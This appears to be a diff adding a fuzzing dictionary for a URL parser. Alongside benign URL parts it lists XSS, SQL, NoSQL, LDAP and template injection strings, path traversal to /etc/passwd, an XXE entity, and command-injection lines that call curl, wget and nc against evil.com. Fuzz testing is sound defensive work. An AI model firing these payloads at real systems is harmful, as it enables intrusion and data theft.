@@ -1,0 +1,379 @@
+"http://"
+"https://"
+"ftp://"
+"file://"
+"localhost"
+"127.0.0.1"
+"?q="
+"#"
+"../"
+# Comprehensive URL-related tokens for better coverage
+
+# Protocol Schemes
+"http://"
+"https://"
+"ftp://"
+"ftps://"
+"file://"
+"javascript:"
+"data:"
+"vbscript:"
+"livescript:"
+"mocha:"
+"jar:"
+"chrome://"
+"chrome-extension://"
+"qrc://"
+"mailto:"
+"tel:"
+"sms:"
+"ssh://"
+"sftp://"
+"ldap://"
+"ldaps://"
+"ws://"
+"wss://"
+"rtsp://"
+"rtmp://"
+"mongodb://"
+"redis://"
+"mysql://"
+"postgresql://"
+"sqlite://"
+
+# URL Components
+"?"
+"&"
+"="
+"#"
+"%"
+"+"
+" "
+"\n"
+"\r"
+"\t"
+"\0"
+
+# Common Domains and Hosts
+"example.com"
+"test.com"
+"localhost"
+"127.0.0.1"
+"0.0.0.0"
+"::1"
+"2001:db8::1"
+"evil.com"
+"malicious.com"
+"user:pass@host"
+"host:8080"
+"host:99999"
+
+# Path Components
+"/"
+"/path"
+"/path/to/resource"
+"/api/v1/users"
+"/wp-admin"
+"/admin"
+"/login"
+"/config"
+"/.env"
+"/.git"
+"/node_modules"
+"/package.json"
+"/index.html"
+"/script.js"
+
+# Query Parameters
+"param=value"
+"param1=value1&param2=value2"
+"id=1"
+"id=1'"
+"id=1\""
+"id=1--"
+"id=1/*"
+"id=1/**/"
+"id=<script>alert('xss')</script>"
+"id=javascript:alert('xss')"
+"id=1 UNION SELECT password FROM users"
+"id=1'; DROP TABLE users; --"
+"id=../etc/passwd"
+"id=..\\windows\\system32\\config\\sam"
+"callback=jsonp"
+"callback=<script>alert('xss')</script>"
+"redirect=http://evil.com"
+"redirect=javascript:alert('xss')"
+"url=data:text/html,<script>alert('xss')</script>"
+
+# Fragment Components
+"#section"
+"#top"
+"##"
+"#<script>alert('xss')</script>"
+"#javascript:alert('xss')"
+"#data:text/html,<script>alert('xss')</script>"
+
+# URL Encoded Characters
+"%00"
+"%01"
+"%0a"
+"%0d"
+"%09"
+"%20"
+"%2b"
+"%2c"
+"%2d"
+"%2e"
+"%2f"
+"%3a"
+"%3b"
+"%3c"
+"%3d"
+"%3e"
+"%3f"
+"%40"
+"%5b"
+"%5c"
+"%5d"
+"%5e"
+"%60"
+"%7b"
+"%7c"
+"%7d"
+"%7e"
+"%7f"
+
+# Double URL Encoding
+"%2520"
+"%2522"
+"%2527"
+"%253c"
+"%253e"
+"%252e"
+"%252f"
+"%255c"
+
+# Unicode in URLs
+"%u0000"
+"%u0001"
+"%u000a"
+"%u000d"
+"%u0009"
+"%u0022"
+"%u0027"
+"%u003c"
+"%u003e"
+"%u005c"
+"%u0060"
+
+# Overlong UTF-8
+"%c0%af"
+"%c1%9c"
+"%c0%80"
+"%c0%81"
+
+# IPv6 Addresses
+"[::1]"
+"[2001:db8::1]"
+"[fe80::1%lo0]"
+"[::ffff:127.0.0.1]"
+
+# International Domain Names
+"测试.com"
+"файл.com"
+"文件.com"
+"домен.рф"
+
+# XSS Payloads in URLs
+"<script>alert('xss')</script>"
+"'><script>alert('xss')</script>"
+"\"><script>alert('xss')</script>"
+"<img src=x onerror=alert('xss')>"
+"<iframe src=\"javascript:alert('xss')\">"
+"<object data=\"javascript:alert('xss')\">"
+"<embed src=\"javascript:alert('xss')\">"
+"<form action=\"javascript:alert('xss')\"><input type=submit>"
+"<a href=\"javascript:alert('xss')\">click</a>"
+"<svg onload=alert('xss')>"
+"<body onload=alert('xss')>"
+"<div onmouseover=alert('xss')>"
+
+# SQL Injection in URLs
+"' OR '1'='1"
+"1' OR '1'='1'--"
+"1\"; DROP TABLE users; --"
+"1' UNION SELECT password FROM users--"
+"admin'--"
+"admin'#"
+"admin'/*"
+"admin'/**/"
+"' OR 1=1--"
+"') OR ('1'='1"
+"1' AND 1=2 UNION SELECT password FROM users--"
+
+# Command Injection in URLs
+"| cat /etc/passwd"
+"; cat /etc/passwd"
+"&& cat /etc/passwd"
+"`cat /etc/passwd`"
+"$(cat /etc/passwd)"
+"|id"
+";id"
+"&&id"
+"`id`"
+"$(id)"
+"|whoami"
+";whoami"
+"&&whoami"
+"`whoami`"
+"$(whoami)"
+"|pwd"
+";pwd"
+"&&pwd"
+"|ls -la"
+";ls -la"
+"&&ls -la"
+"|env"
+";env"
+"&&env"
+"|curl http://evil.com"
+";curl http://evil.com"
+"&&curl http://evil.com"
+"|wget http://evil.com"
+";wget http://evil.com"
+"&&wget http://evil.com"
+"|nc evil.com 4444"
+";nc evil.com 4444"
+"&&nc evil.com 4444"
+
+# Path Traversal in URLs
+"../etc/passwd"
+"../../etc/passwd"
+"../../../etc/passwd"
+"../../../../etc/passwd"
+"../../../../../../etc/passwd"
+"../../../../../../../../etc/passwd"
+"..%2fetc%2fpasswd"
+"..%2f..%2fetc%2fpasswd"
+"..%2f..%2f..%2fetc%2fpasswd"
+"..%c0%afetc%c0%afpasswd"
+"..%c0%af..%c0%afetc%c0%afpasswd"
+"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+"....//etc/passwd"
+"....\\\\windows\\system32\\config\\sam"
+"....//....//etc/passwd"
+"....\\\\....\\\\windows\\system32\\config\\sam"
+
+# Template Injection in URLs
+"{{config.items()}}"
+"{{self.__dict__}}"
+"{{7*7}}"
+"{{''.__class__.__mro__[2].__subclasses__()[40]('etc/passwd').read()}}"
+"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+
+# Server Side Template Injection
+"${7*7}"
+"#{7*7}"
+"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}"
+"{{7*7}}"
+"<%= 7*7 %>"
+"<?php echo 7*7; ?>"
+"#{7*7}"
+"${{7*7}}"
+
+# NoSQL Injection
+"{\"$gt\":\"\"}"
+"{\"$where\":\"this.password.length > 0\"}"
+"|| 1==1"
+"true, $where: '1 == 1'"
+"{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}"
+"{\"username\":{\"$regex\":\".*\"}}"
+"{\"username\":{\"$in\":[\"admin\"]}}"
+
+# LDAP Injection
+"*)(uid=*))(|(uid=*"
+"*))%00"
+"*))(|(1=1"
+"*))(|(objectClass=*"
+"*))(|(cn=*"
+"*))(|(sn=*"
+"*))(|(givenName=*"
+
+# XPath Injection
+"' or '1'='1"
+"x' or 1=1 or 'x'='y"
+"' or ''='"
+"x' or 1=1 or 'x'='y"
+"' and count(/*)=1 and '1'='1"
+"' and contains(.,'admin') and '1'='1"
+
+# XML External Entity (XXE)
+"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+"<!ENTITY xxe SYSTEM \"http://evil.com/malicious.dtd\">"
+"<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
+"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+
+# Control Characters
+"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
+
+# Unicode Control Characters
+"\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u0008\u0009\u000a\u000b\u000c\u000d\u000e\u000f"
+"\u0010\u0011\u0012\u0013\u0014\u0015\u0016\u0017\u0018\u0019\u001a\u001b\u001c\u001d\u001e\u001f"
+"\u007f\u0080\u0081\u0082\u0083\u0084\u0085\u0086\u0087\u0088\u0089\u008a\u008b\u008c\u008d\u008e\u008f"
+
+# Right-to-Left Override and Unicode Tricks
+"\u202E"
+"\u202ESPOOFED_URL"
+"\u202E\u2066\u2069"
+"а"  # Cyrillic 'a'
+"е"  # Cyrillic 'e'
+"о"  # Cyrillic 'o'
+"р"  # Cyrillic 'p'
+"с"  # Cyrillic 'c'
+"у"  # Cyrillic 'u'
+"х"  # Cyrillic 'x'
+
+# Zero Width Characters
+"\u200B"
+"\u200C"
+"\u200D"
+"\uFEFF"
+
+# Emoji and Special Characters
+"🚀💥🔥💯😈👾🤖💣💥🔥"
+"🔗📋💾📁🔒⚠️🚨🚫✅❌"
+
+# Very Long URLs (DoS)
+"very-long-url-that-keeps-going-on-and-on-and-never-ends-and-could-potentially-cause-denial-of-service-conditions-by-consuming-excessive-memory-or-processing-time-when-parsed-or-validated-by-the-url-parsing-library-or-application"
+"extremely-long-domain-name-that-exceeds-normal-limits-and-might-cause-issues-with-dns-resolution-or-url-parsing.extremely-long-tld"
+
+# Invalid Port Numbers
+":0"
+":65535"
+":65536"
+":99999"
+":-1"
+
+# Invalid Characters in Various Positions
+"http://host name/"
+"http://host\nname/"
+"http://host\rname/"
+"http://host\tname/"
+"http://host\0name/"
+"http://user@host name/"
+"http://user\n@host/"
+"http://host:port name/"
+"http://host\n:port/"
+"http://host?param name"
+"http://host?param\nvalue"
+"http://host#frag name"
+"http://host#frag\nment"
+
+# Mixed Encoding
+"http://host%2ecom"  # http://host.com
+"http://host%2Ecom"  # http://host.com
+"http://host%252ecom"  # http://host%2ecom
+"javascript%3aalert('xss')"  # javascript:alert('xss')
+"data%3atext/html,<script>alert('xss')</script>"  # data:text/html,<script>alert('xss')</script>
